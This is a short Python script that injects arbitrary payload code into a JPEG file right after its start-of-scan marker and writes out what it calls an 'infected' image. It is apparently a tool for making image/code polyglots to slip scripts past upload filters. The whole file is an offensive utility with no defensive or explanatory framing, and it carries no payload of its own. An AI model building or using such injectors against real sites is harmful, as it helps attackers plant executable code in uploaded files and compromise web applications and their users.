#!/usr/bin/python
import sys
import binascii
import os

MAGIC_NUMBER = "03010002110311003f00"
BIN_MAGIC_NUMBER = binascii.unhexlify(MAGIC_NUMBER)

def main():
    path_to_vector_image = sys.argv[1]
    payload_data = sys.argv[2]
    path_to_output = sys.argv[3]

    print("[ ] Decoding the payload...")
    bin_payload_data = bytes(payload_data, 'utf-8')
    # in case the payload is actually stored in a file
    if os.path.exists(payload_data):
        with open(payload_data, "r") as payload_file:
            bin_payload_data = bytes(payload_file.read(), 'utf-8')
    print("[+] Payload ready.")

    with open(path_to_vector_image, 'rb') as vector_file:
        bin_vector_data = vector_file.read()

        print("[ ] Searching for magic number...")
        injection_start_index = find_injection_start_index(bin_vector_data)

        if injection_start_index >= 0:
            print("[+] Found magic number.")
            with open(path_to_output, 'wb') as infected_file:
                print("[ ] Injecting payload...")
                infected_file.write(
                    inject_payload(
                        bin_vector_data,
                        injection_start_index,
                        bin_payload_data))
                print("[+] Payload written.")
        else:
            print("[-] Magic number not found. Exiting.")

def find_injection_start_index(
        data: bytes) -> int:
    index =  data.find(BIN_MAGIC_NUMBER)

    if index >= 0:
        index += len(BIN_MAGIC_NUMBER)

    return index

def inject_payload(
        vector: bytes,
        index: int,
        payload: bytes) -> bytes:
    pre_payload = vector[:index]
    post_payload = vector[index + len(payload):]

    return (pre_payload + payload + post_payload + bytes('\n', 'utf-8'))

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("USAGE: <jpeg file path> <payload code> <output path>")
    else:
        main()
